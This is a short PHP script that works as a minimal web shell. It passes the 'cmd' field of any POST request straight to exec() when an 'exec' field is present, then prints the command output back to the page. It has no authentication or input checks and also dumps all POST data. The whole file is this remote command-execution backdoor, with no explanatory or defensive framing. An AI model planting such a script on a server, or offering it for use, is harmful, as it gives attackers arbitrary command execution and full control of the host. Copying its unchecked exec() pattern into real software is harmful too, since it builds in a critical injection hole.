<?php
$htmlResp = "";
var_dump($_POST);

if (isset($_POST['exec'])) {

    exec($_POST['cmd'], $result);

    $htmlResp .= '----------------- < OutPut > -----------------';
    $htmlResp .= '<pre>';
    foreach ($result as $print) {
        $print = str_replace('<', '&lt;', $print);
        $htmlResp .= $print . '<br>';
    }
    $htmlResp .= '</pre>';
} else {
    $htmlResp = '<br>';
}
echo $htmlResp;